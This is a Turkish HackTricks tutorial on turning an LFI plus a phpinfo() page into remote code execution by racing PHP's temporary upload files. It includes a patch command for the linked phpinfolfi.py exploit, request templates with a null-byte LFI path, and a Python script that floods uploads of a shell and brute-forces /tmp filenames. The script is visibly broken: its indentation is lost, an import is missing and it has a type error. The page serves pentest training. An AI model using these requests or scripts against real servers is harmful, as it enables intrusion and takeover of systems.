{{#include ../../banners/hacktricks-training.md}}

Bu güvenlik açığını istismar etmek için şunlara ihtiyacınız var: **Bir LFI açığı, phpinfo()'un görüntülendiği bir sayfa, "file_uploads = on" ve sunucunun "/tmp" dizinine yazabilmesi.**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**Eğitim HTB**: [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk&t=600s)

İstismarı düzeltmeniz gerekiyor ( **=>**'yi **=>** ile değiştirin). Bunu yapmak için şunları yapabilirsiniz:
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
Başlangıçta **payload**'ı değiştirmelisiniz (örneğin bir php-rev-shell için), **REQ1** (bu phpinfo sayfasına işaret etmeli ve padding içermelidir, yani: _REQ1="""POST /install.php?mode=phpinfo\&a="""+padding+""" HTTP/1.1_), ve **LFIREQ** (bu LFI zafiyetine işaret etmelidir, yani: _LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ Null karakteri sömürürken çift "%" olduğuna dikkat edin)

{{#file}}
LFI-With-PHPInfo-Assistance.pdf
{{#endfile}}

### Teori

Eğer PHP'de yüklemelere izin veriliyorsa ve bir dosya yüklemeye çalışıyorsanız, bu dosya sunucu isteği işleyene kadar geçici bir dizinde saklanır, ardından bu geçici dosya silinir.

Sonra, web sunucusunda bir LFI zafiyeti bulduysanız, oluşturulan geçici dosyanın adını tahmin etmeye çalışabilir ve dosya silinmeden önce geçici dosyaya erişerek bir RCE sömürü yapabilirsiniz.

**Windows**'ta dosyalar genellikle **C:\Windows\temp\php** dizininde saklanır.

**Linux**'ta dosyanın adı genellikle **rastgele** olup **/tmp** dizininde bulunur. Ad rastgele olduğu için, **geçici dosyanın adını bir yerden çıkarmak** ve silinmeden önce erişmek gereklidir. Bu, "**phpconfig()**" fonksiyonunun içindeki **$\_FILES** değişkeninin değerini okuyarak yapılabilir.

**phpinfo()**

**PHP**, **4096B**'lik bir tampon kullanır ve tampon **dolu** olduğunda, **istemciye gönderilir**. Ardından istemci, **birçok büyük istek** (büyük başlıklar kullanarak) **yükleyerek bir php** ters **shell** yükleyebilir, **phpinfo()'un ilk kısmının** (geçici dosyanın adının bulunduğu yer) **geri dönmesini bekleyebilir** ve php sunucusu dosyayı silmeden önce **geçici dosyaya erişmeye** çalışabilir, böylece bir LFI zafiyetini sömürebilir.

**İsimleri brute force denemek için Python scripti (uzunluk = 6)**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
{{#include ../../banners/hacktricks-training.md}}
